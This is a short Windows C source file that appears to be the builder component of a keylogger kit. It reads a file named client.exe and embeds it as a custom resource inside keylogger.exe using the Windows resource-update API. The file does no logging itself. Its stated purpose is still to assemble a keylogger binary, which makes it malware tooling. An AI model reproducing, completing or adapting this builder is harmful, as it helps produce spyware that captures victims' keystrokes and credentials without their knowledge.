#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
//---------------------------------------
int update_res(char exe[], char res_name[], char res_type[], unsigned char *res, size_t res_len);
//---------------------------------------
int main(void)
{
	FILE *client;
	unsigned char *bclient;
	unsigned long lclient;
	client = fopen("client.exe", "rb");
	if (client != NULL)
	{
		fseek(client, 0, SEEK_END);
		lclient = ftell(client);
		rewind(client);
		bclient = (unsigned char*)malloc(sizeof(unsigned char) * lclient);
		fread(bclient, 1, lclient, client);
		fclose(client);
		update_res((char*)"keylogger.exe", (char*)"XNOT", (char*)"EBE", bclient, lclient);
		free(bclient);
	}
	else
	{
		printf("Could not find client.exe!\nPress any button...");
		getchar();
	}
	//---------------------------------------
	return 0;
}
//---------------------------------------
int update_res(char exe[], char res_name[], char res_type[], unsigned char *res, size_t res_len)
{
	HANDLE hUpdateRes;
	BOOL result;
	hUpdateRes = BeginUpdateResource(exe, FALSE);
	if (hUpdateRes == NULL) return 0;
	result = UpdateResource(hUpdateRes, res_type, res_name, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), res, res_len);
	if (result == FALSE) return 0;
	if (!EndUpdateResource(hUpdateRes, FALSE)) return 0;
	return 1;
}
